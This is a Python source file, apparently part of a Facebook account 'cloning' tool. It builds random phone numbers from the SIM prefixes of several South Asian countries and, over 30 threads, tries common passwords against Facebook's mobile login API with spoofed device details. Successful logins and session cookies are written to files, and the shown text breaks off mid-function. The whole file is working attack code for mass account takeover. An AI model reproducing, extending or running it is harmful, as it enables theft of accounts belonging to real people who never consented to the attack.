                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [ANKIT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        #open('/sdcard/ANKIT-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/ANKIT-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[38;5;205m [ANKIT-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ANKIT-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#------------[ THIS RANDOM IS BULL SHIT  ]--------------#
def ANKIT4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [NOT-ANKIT->M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1440,height=3130};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [ANKIT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/ANKIT-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/ANKIT-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[38;5;205m [ANKIT-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ANKIT-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#------------[ THIS RANDOM IS BULL SHIT  ]--------------#
def ANKIT5(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [NOT-ANKIT->M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=2246};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [ANKIT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ANKIT-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[38;5;205m [ANKIT-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ANKIT-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#------------[ THIS RANDOM IS BULL SHIT  ]--------------#
def ANKIT6(ids,passlist):
	global loop
	global oks
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;37m [NOT-ANKIT->M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
			ua = random.choice(ugen)
			free_fb = session.get('https://free.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority':'p.facebook.com',
			'upgrade-insecure-requests': '1',
			'viewport-width': '980',
			'method': 'path',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 
			'dnt':'1', 
			'x-requested-with':'mark.via.gp', 
			'sec-fetch-site': 'none',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-user': '?1',
			'sec-fetch-dest': 'document',
			'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
			"sec-ch-prefers-color-scheme": "light",
			'user-agent': ua}
			lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				uid = coki[151:166]
				if uid in oks:pass
				else:
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [ANKIT-2F] '+uid+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [ANKIT-OK] '+uid+' | '+pas)
						open('/sdcard/ANKIT-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
						oks.append(uid)
						break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				uid=coki[141:156]
				if uid in cps:pass
				else:
					print('\r\r\x1b[38;5;205m [ANKIT-CP] '+uid+' | '+pas+'\033[1;97m')
					open('/sdcard/ANKIT-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(10)
	except:
		pass
#------------[ YESS THIS IS WORKING RANDOM SETTING AND METHOD ]--------------#
#------------[ RANDOM SYSTEM ]--------------#     
def rndm():
    clear()
    animation(f""" \x1b[38;5;196m[\x1b[37m1\x1b[38;5;196m]\x1b[37m BANGLADESH CLONING""") 
    animation(f""" \x1b[38;5;196m[\x1b[37m2\x1b[38;5;196m]\x1b[37m INDIA CLONING""") 
    animation(f""" \x1b[38;5;196m[\x1b[37m3\x1b[38;5;196m]\x1b[37m NEPAL CLONING""") 
    animation(f""" \x1b[38;5;196m[\x1b[37m4\x1b[38;5;196m]\x1b[37m PAKISTAN CLONING""") 
    animation(f""" \x1b[38;5;196m[\x1b[37m5\x1b[38;5;196m]\x1b[37m AFGHANISTAN CLONING""") 
    animation(f""" \x1b[38;5;196m[\x1b[37m6\x1b[38;5;196m]\x1b[37m GMAIL CLONING""") 
    animation(f""" \x1b[38;5;196m[\x1b[37m0\x1b[38;5;196m]\x1b[37m BACK TO MENU""");linex()
    option=input('\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CHOOSE : ')
    if option in ['1','A']:
        bd()
    elif option in ['2','B']:
    	india()
    elif option in ['3','C']:
    	nepal()
    elif option in ['4','D']:
    	pakistan()
    elif option in ['5','E']:
    	afghanistan()
    elif option in ['6','00']:
    	gmail()
    elif option in ['0','00']:
    	menu()
    else:
        exit(f'{B}❲{A}={B}❳{G} BYE BYE ')
#__________________| BANGLADESH |__________________#
def bd():
		user=[]
		clear()
		print(f'\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37mEXAMPLE : 017 | 019 | 018 | 016 ');linex()
		code = input(f'\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CHOICE  : ')
		clear();print(f'\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37mEXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CHOICE  : '))
		clear()
		animation(" \x1b[38;5;196m[\x1b[37m1\x1b[38;5;196m]\x1b[37m METHOD 1 \n \x1b[38;5;196m[\x1b[37m2\x1b[38;5;196m]\x1b[37m METHOD 2 \n \x1b[38;5;196m[\x1b[37m3\x1b[38;5;196m]\x1b[37m METHOD 3 ");linex()
		mthd = input(f'\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CHOICE  : ')
		for nmbr in range(limit):
			nmp=''.join(random.choice(string.digits) for _ in range(8))
			user.append(nmp)
		with tred(max_workers=30) as habib:	
			clear()
			tl = str(len(user))
			print(f'\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m SIM CODE :{A} {code} ')
			print(f'\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m TOTAL ID :{A} {tl} ')
			print(f'\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m USE FLIGHT MODE FOR SPEED UP');linex()
			for psx in user:
				uid = code+psx
				passlist = [psx,uid,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
				if mthd in ['1','01']:
					habib.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					habib.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					habib.submit(rndm3,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'{B}❲{A}={B}❳{G} THE PROCESS HAS COMPLETED')
		print(f'{B}❲{A}={B}❳{G} TOTAL OK ID : '+str(len(oks)))
		print(f'{B}❲{A}={B}❳{G} TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'{B}❲{A}={B}❳{G} PRESS ENTER TO BACK ')
		menu()
#__________________| INDIA |__________________#
def india():
		user=[]
		clear()
		print(f'{B}❲{A}={B}❳{G}\033[1;32m EXAMPLE : +91639 | +91934 | +91902 | +91937 ');linex()
		code = input(f'{B}❲{A}?{B}❳{G}\033[1;32m CHOICE  : ')
		clear();print(f'{B}❲{A}={B}❳{G}\033[1;32m EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{B}❲{A}?{B}❳{G} CHOICE  : '))
		clear()
		print(f'{B}❲{A}1{B}❳{G}\033[1;32m METHOD {B}❲{A}M1{B}❳{G} \n{B}❲{A}2{B}❳{G}\033[1;32m METHOD {B}❲{A}M2{B}❳{G}\n{B}❲{A}3{B}❳{G}\033[1;32m METHOD {B}❲{A}M3{B}❳{G} ');linex()
		mthd = input(f'{B}❲{A}?{B}❳{G}\033[1;32m CHOICE  : ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as habib:	
			clear()
			tl = str(len(user))
			print(f'{B}❲{A}={B}❳{G}\033[1;32m SIM CODE :{A} {code} ')
			print(f'{B}❲{A}={B}❳{G}\033[1;32m TOTAL ID :{A} {tl} ')
			print(f'{B}❲{A}={B}❳{G}\033[1;32m USE FLIGHT MODE FOR SPEED UP');linex()
			for psx in user:
				uid = code+psx
				passlist = [psx,uid[:8],'57273200','59039200','57575751']
				if mthd in ['1','01']:
					habib.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					habib.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					habib.submit(rndm3,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'{B}❲{A}={B}❳{G} THE PROCESS HAS COMPLETED')
		print(f'{B}❲{A}={B}❳{G} TOTAL OK ID : '+str(len(oks)))
		print(f'{B}❲{A}={B}❳{G} TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'{B}❲{A}={B}❳{G} PRESS ENTER TO BACK ')
		menu()
#__________________| NEPAL |__________________#
def nepal():
		user=[]
		clear()
		print(f'\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37mEXAMPLE : 9841 | 9840 | 9866 | 9848 ');linex()
		code = input(f'\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CHOICE  : ')
		clear();print(f'\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37mEXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CHOICE  : '))
		clear()
		animation(" \x1b[38;5;196m[\x1b[37m1\x1b[38;5;196m]\x1b[37m METHOD 1 \n \x1b[38;5;196m[\x1b[37m2\x1b[38;5;196m]\x1b[37m METHOD 2 \n \x1b[38;5;196m[\x1b[37m3\x1b[38;5;196m]\x1b[37m METHOD 3 ");linex()
		mthd = input(f'\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CHOICE  : ')
		for nmbr in range(limit):
			nmp=''.join(random.choice(string.digits) for _ in range(8))
			user.append(nmp)
		with tred(max_workers=30) as habib:	
			clear()
			tl = str(len(user))
			print(f'\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m SIM CODE :{A} {code} ')
			print(f'\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m TOTAL ID :{A} {tl} ')
			print(f'\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m USE FLIGHT MODE FOR SPEED UP');linex()
			for psx in user:
				uid = code+psx
				passlist = [uid,psx,uid[:8],uid[:7],uid[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
				if mthd in ['1','01']:
					habib.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					habib.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					habib.submit(rndm3,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'{B}❲{A}={B}❳{G}\033[1;32m THE PROCESS HAS COMPLETED')
		print(f'{B}❲{A}={B}❳{G}\033[1;32m TOTAL OK ID : '+str(len(oks)))
		print(f'{B}❲{A}={B}❳{G}\033[1;32m TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'{B}❲{A}={B}❳{G}\033[1;32m PRESS ENTER TO BACK ')
		menu()
#__________________| PAKISTAN |__________________#
def pakistan():
		user=[]
		clear()
		print(f'{B}❲{A}={B}❳{G}\033[1;32m EXAMPLE : 0306 | 0335 | 0315 | 0345 ');linex()
		code = input(f'{B}❲{A}?{B}❳{G}\033[1;32m CHOICE  : ')
		clear();print(f'{B}❲{A}={B}❳{G}\033[1;32m EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{B}❲{A}?{B}❳{G}\033[1;32m CHOICE  : '))
		clear()
		print(f'{B}❲{A}1{B}❳{G}\033[1;32m METHOD {B}❲{A}M1{B}❳{G} \n{B}❲{A}2{B}❳{G}\033[1;32m METHOD {B}❲{A}M2{B}❳{G}\n{B}❲{A}3{B}❳{G}\033[1;32m METHOD {B}❲{A}M3{B}❳{G} ');linex()
		mthd = input(f'{B}❲{A}?{B}❳{G}\033[1;32m CHOICE  : ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as habib:	
			clear()
			tl = str(len(user))
			print(f'{B}❲{A}={B}❳{G} SIM CODE :{A} {code} ')
			print(f'{B}❲{A}={B}❳{G} TOTAL ID :{A} {tl} ')
			print(f'{B}❲{A}={B}❳{G} USE FLIGHT MODE FOR SPEED UP');linex()
			for psx in user:
				uid = code+psx
				passlist = [psx,uid,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
				if mthd in ['1','01']:
					habib.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					habib.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					habib.submit(rndm3,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'{B}❲{A}={B}❳{G} THE PROCESS HAS COMPLETED')
		print(f'{B}❲{A}={B}❳{G} TOTAL OK ID : '+str(len(oks)))
		print(f'{B}❲{A}={B}❳{G} TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'{B}❲{A}={B}❳{G} PRESS ENTER TO BACK ')
		menu()
#__________________| AFGHANISTAN |__________________#
def afghanistan():
		user=[]
		clear()
		print(f'{B}❲{A}={B}❳{G} EXAMPLE : +9340 | +9360 | +9330 | +9350');linex()
		code = input(f'{B}❲{A}?{B}❳{G} CHOICE  : ')
		clear();print(f'{B}❲{A}={B}❳{G} EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{B}❲{A}?{B}❳{G} CHOICE  : '))
		clear()
		print(f'{B}❲{A}1{B}❳{G} METHOD {B}❲{A}M1{B}❳{G} \n{B}❲{A}2{B}❳{G} METHOD {B}❲{A}M2{B}❳{G}\n{B}❲{A}3{B}❳{G} METHOD {B}❲{A}M3{B}❳{G} ');linex()
		mthd = input(f'{B}❲{A}?{B}❳{G} CHOICE  : ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as habib:	
			clear()
			tl = str(len(user))
			print(f'{B}❲{A}={B}❳{G} SIM CODE :{A} {code} ')
			print(f'{B}❲{A}={B}❳{G} TOTAL ID :{A} {tl} ')
			print(f'{B}❲{A}={B}❳{G} USE FLIGHT MODE FOR SPEED UP');linex()
			for psx in user:
				uid = code+psx
				passlist = [psx,uid,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
				if mthd in ['1','01']:
					habib.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					habib.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					habib.submit(rndm3,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'{B}❲{A}={B}❳{G} THE PROCESS HAS COMPLETED')
		print(f'{B}❲{A}={B}❳{G} TOTAL OK ID : '+str(len(oks)))
		print(f'{B}❲{A}={B}❳{G} TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'{B}❲{A}={B}❳{G} PRESS ENTER TO BACK ')
		menu()		
		
#__________________| RANDOM METHOD M1 |__________________#
def rndm1(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r\033[1;37m[NOT-ANKIT->M1]\033[1;37m %s {B}|{G}\033[1;37m OK{B}|{G}\033[1;37mCP{G}\033[1;37m %s{B}|{G}\033[1;37m%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; V2027 Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)})[FBAN/FB4A;FBAV/45.0.0.{str(random.randint(1000,9000))};FBBV/{str(random.randint(100000,900000))};[FBAN/FB4A;FBAV/3.9;FBBV/666389;FBDM/'+'{density=1.0,width=320,height=480}'+';FBLC/en_US;FBCR/o2 - de;FBPN/com.facebook.katana;FBDV/HTC Desire 200;FBSV/4.0.3;FBOP/18;FBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':uid,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                "sim_country": "id",
                                "network_country": "id",
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ONE(),
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{B}❲{G}\033[1;32mANKIT-OK{B}❳{G}\033[1;32m '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print(f"\r\r{B}❲{G}\033[1;37mCOOKIE{B}❳>{A} "+coki)
                                        open('/sdcard/ANKIT-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
